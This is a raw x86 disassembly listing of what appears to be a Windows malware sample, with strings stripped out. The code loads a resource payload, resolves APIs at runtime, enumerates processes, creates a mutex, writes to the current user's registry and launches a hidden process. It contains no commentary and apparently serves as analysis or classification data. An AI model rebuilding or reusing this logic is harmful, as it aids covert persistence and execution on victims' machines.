call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push 0x26
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x25
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_40712f
add esp 0xc
mov ecx rw-data
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
push esi
push esi
push sub_401883
push esi
push esi
call edi
lea eax [ ebp - 0x4c ]
push eax
call sub_40e549
pop ecx
push eax
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ rw-data ]
cmp eax esi
je r-xdata
push 0x2d
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
push eax
push 0x2c
mov ecx ebx
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x0
setne al
push eax
call sub_405f6c
pop ecx
pop ecx
call sub_409e73
push esi
call eax
sub_407c53
push ebp
mov ebp esp
sub esp 0x440
and [ ebp - 0x8 ] 0x0
push ebx
push esi
lea eax [ ebp - 0x8 ]
push edi
push eax
call sub_408150
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
movzx ebx [ eax ]
push ebx
call [ malloc@IAT ]
mov edx [ ebp - 0x8 ]
pop ecx
pop ecx
mov edi eax
mov ecx ebx
lea esi [ edx + 0x1 ]
mov edx ecx
mov [ ebp - 0x14 ] eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x9 ]
push ecx
push ebx
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
or eax 0xffffffff
sub eax ebx
add [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
call [ malloc@IAT ]
mov edi eax
mov eax [ ebp - 0x8 ]
pop ecx
mov [ ebp - 0x10 ] edi
mov ecx [ ebp - 0x4 ]
lea esi [ ebx + eax + 0x1 ]
mov eax ecx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
push [ ebp - 0x14 ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x440 ]
call sub_4028eb
push [ ebp - 0x4 ]
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x440 ]
push [ ebp - 0x10 ]
push eax
call sub_402a2a
push [ ebp - 0x10 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
sub_407d38
push ebx
mov ebx [ LoadLibraryA@IAT ]
push esi
push edi
push r--data
push r--data
call ebx
mov esi [ GetProcAddress@IAT ]
push eax
call esi
mov edi [ GetModuleHandleA@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
push r--data
push r--data
call ebx
push eax
call esi
cmp [ rw-data ] 0x0
mov [ rw-data ] eax
jne r-xdata
push r--data
push r--data
call edi
push eax
call esi
mov [ rw-data ] eax
push r--data
push r--data
call ebx
push eax
call esi
mov ebx r--data
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push r--data
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
retn
push r--data
push r--data
call edi
push eax
call esi
mov [ rw-data ] eax
sub_407e0b
push ebp
mov ebp esp
sub esp 0x304
push ebx
push esi
push edi
lea eax [ ebp - 0x304 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
mov esi [ std::operator==@IAT ]
lea eax [ ebp + 0x8 ]
push r--data
push eax
call esi
mov ebx [ CloseHandle@IAT ]
pop ecx
test al al
pop ecx
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
call sub_40e5ce
pop ecx
push eax
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40f0b5
test al al
je r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x200 ]
push eax
mov [ ebp - 0x200 ] 0x128
push [ ebp - 0x8 ]
call Process32First
lea eax [ ebp - 0x200 ]
push eax
push [ ebp - 0x8 ]
call Process32Next
mov edi r--data
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x304 ]
push eax
call [ std::operator==@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
mov edi r--data
push 0x0
push edi
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov edx eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp edx [ eax ]
je r-xdata
push [ ebp - 0x8 ]
call ebx
lea eax [ ebp - 0x18 ]
push edi
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x1dc ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::end@IAT ]
push eax
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
push eax
call sub_408667
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ std::operator==@IAT ]
add esp 0x18
test al al
jne r-xdata
push 0x1
lea eax [ ebp - 0x304 ]
push 0x25
push eax
lea ecx [ ebp - 0xd8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::basic_ifstream<char,struct std::char_traits<char> >@IAT ]
lea ecx [ ebp - 0xd8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::is_open@IAT ]
test al al
je r-xdata
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push r--data
push ecx
push edx
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::replace@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0x1f8 ]
lea eax [ ebp - 0x40 ]
push eax
call sub_40f114
pop ecx
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x304 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x200 ]
push eax
push [ ebp - 0x8 ]
call Process32Next
jmp r-xdata
lea ecx [ ebp - 0xd8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0xd8 ]
push eax
call [ std::basic_istream<char,struct std::char_traits<char> >::tellg@IAT ]
push 0x6
mov esi eax
pop ecx
lea edi [ ebp - 0x48 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x48 ]
call sub_405288
push eax
call ??2@YAPAXI@Z
pop ecx
xor esi esi
push esi
push esi
lea ecx [ ebp - 0xd8 ]
mov edi eax
call [ std::basic_istream<char,struct std::char_traits<char> >::seekg@IAT ]
lea ecx [ ebp - 0x48 ]
call sub_405288
push eax
push edi
lea ecx [ ebp - 0xd8 ]
call [ std::basic_istream<char,struct std::char_traits<char> >::read@IAT ]
lea ecx [ ebp - 0xd8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::close@IAT ]
push r--data
push 0x1
push esi
call [ CreateMutexA@IAT ]
push edi
lea ecx [ ebp + 0x8 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_40d477
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor al al
lea eax [ ebp - 0x18 ]
push edi
push eax
call esi
pop ecx
test al al
pop ecx
jne r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
test eax eax
je r-xdata
push esi
call ebx
xor bl bl
push 0x1
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_409046
add esp 0x10
mov bl 0x1
jmp r-xdata
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
push [ ebp - 0x1f8 ]
call sub_40f0df
test al al
pop ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
call sub_40fc2c
pop ecx
lea ecx [ ebp - 0xd8 ]
call [ std::basic_ifstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_408150
push ebp
mov ebp esp
push esi
push edi
push 0xa
push r--data
push 0x0
call [ FindResourceA@IAT ]
mov edi eax
push edi
push 0x0
call [ LoadResource@IAT ]
push eax
call [ LockResource@IAT ]
push edi
push 0x0
mov esi eax
call [ SizeofResource@IAT ]
mov ecx [ ebp + 0x8 ]
pop edi
mov [ ecx ] esi
pop esi
pop ebp
retn
sub_40818a
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push 0x3
push eax
push 0x5a
push 0x800
call [ GetLocaleInfoA@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_4081b7
push ebp
mov ebp esp
sub esp 0x320
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40f0b5
push 0x0
push 0x2
mov [ rw-data ] al
call CreateToolhelp32Snapshot
mov edi eax
lea eax [ ebp - 0x320 ]
push eax
push edi
mov [ ebp - 0x320 ] 0x22c
call Process32FirstW
lea eax [ ebp - 0x320 ]
push eax
push edi
call Process32NextW
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
leave
retn
push esi
mov esi r--data
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2fc ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
push [ ebp - 0x318 ]
call sub_40f0df
movzx eax al
push eax
lea eax [ ebp - 0xe4 ]
push eax
call sub_40ed35
add esp 0xc
push eax
push esi
push [ ebp - 0x318 ]
lea eax [ ebp - 0xc4 ]
push eax
call sub_40ed35
pop ecx
pop ecx
push eax
push esi
push [ ebp - 0x318 ]
lea eax [ ebp - 0xa4 ]
push eax
call sub_40f16a
push eax
lea eax [ ebp - 0x84 ]
push eax
call sub_40edd3
add esp 0x10
push eax
lea eax [ ebp - 0x24 ]
push esi
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_40edd3
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0x14
push eax
lea eax [ ebp - 0xd4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xf4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xb4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x94 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xf4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xd4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xe4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x320 ]
push eax
push edi
call Process32NextW
test eax eax
jne r-xdata
pop esi
sub_4083e6
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x1 ]
push esi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov esi eax
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push 0xa
push eax
push esi
call [ GetDriveTypeA@IAT ]
push eax
call [ _itoa@IAT ]
add esp 0xc
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x44 ]
push 0x2d
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push esi
call [ lstrlenA@IAT ]
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
sub_4084b8
push ebp
mov ebp esp
sub esp 0x54
push esi
push edi
push 0x11
xor eax eax
pop ecx
lea edi [ ebp - 0x54 ]
[ edi ]
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x54 ] 0x44
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
xor eax eax
push eax
push eax
push 0x8000000
push eax
push eax
push eax
push r--data
push r--data
call [ CreateProcessA@IAT ]
push [ ebp - 0x10 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0xc ]
call esi
pop edi
pop esi
leave
retn
sub_408510
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx edi
call sub_4012b5
mov ecx esi
mov ebx eax
call sub_4012b5
cmp ebx eax
ja r-xdata
mov ecx edi
call sub_4012b5
mov ecx esi
mov ebx eax
call sub_408620
cmp ebx eax
ja r-xdata
push [ esi + 0x4 ]
mov ecx edi
call sub_408637
push eax
mov ecx edi
call sub_408633
push eax
call sub_40868c
add esp 0xc
mov ecx esi
push [ esi + 0x8 ]
push eax
call sub_401b6b
push [ esi + 0x8 ]
mov ecx esi
push [ esi + 0x4 ]
call sub_401b6b
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
push ecx
push eax
mov ecx esi
call sub_403626
push 0x0
mov ecx edi
call sub_4012b5
push eax
mov ecx esi
call sub_401bb5
push eax
mov ecx edi
mov [ esi + 0x4 ] eax
call sub_408637
push eax
mov ecx edi
call sub_408633
push eax
mov ecx esi
call sub_40863b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov ecx esi
call sub_4012b5
mov ebx eax
mov ecx edi
shl ebx 0x4
call sub_408633
push [ esi + 0x4 ]
add ebx eax
mov ecx edi
push ebx
call sub_408633
push eax
call sub_40868c
add esp 0xc
mov ecx edi
push [ esi + 0x8 ]
call sub_408637
push eax
push ebx
mov ecx esi
call sub_40863b
jmp r-xdata
mov ecx edi
call sub_4012b5
shl eax 0x4
add eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
sub_40863b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
retn 0xc
push esi
mov ecx edi
push [ ebp + 0x10 ]
call sub_401bc8
add [ ebp + 0x10 ] 0x10
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_408667
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
movsx eax [ esi ]
push eax
call [ ebp + 0x14 ]
pop ecx
inc esi
mov ecx [ ebp + 0x10 ]
inc [ ebp + 0x10 ]
mov [ ecx ] al
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_40868c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
mov ecx [ ebp + 0x10 ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
add [ ebp + 0x10 ] 0x10
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_4086b1
push ebp
mov ebp esp
sub esp 0x3bc
push ebx
push esi
push edi
lea eax [ ebp - 0x3bc ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
and [ ebp - 0x2 ] 0x0
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x3 ] 0x0
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0xb8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x108 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0xd8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_40e6bb
pop ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xc8 ]
push 0x30
push eax
call sub_40712f
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_40e6bb
pop ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xe8 ]
push 0x30
push eax
call sub_40712f
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
push eax
call sub_40e6bb
pop ecx
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xf8 ]
push 0x30
push eax
call sub_40712f
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov edi r--data
lea eax [ ebp - 0xc8 ]
push edi
push eax
lea eax [ ebp - 0x1 ]
mov esi r--data
push eax
push esi
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea eax [ ebp - 0x3bc ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
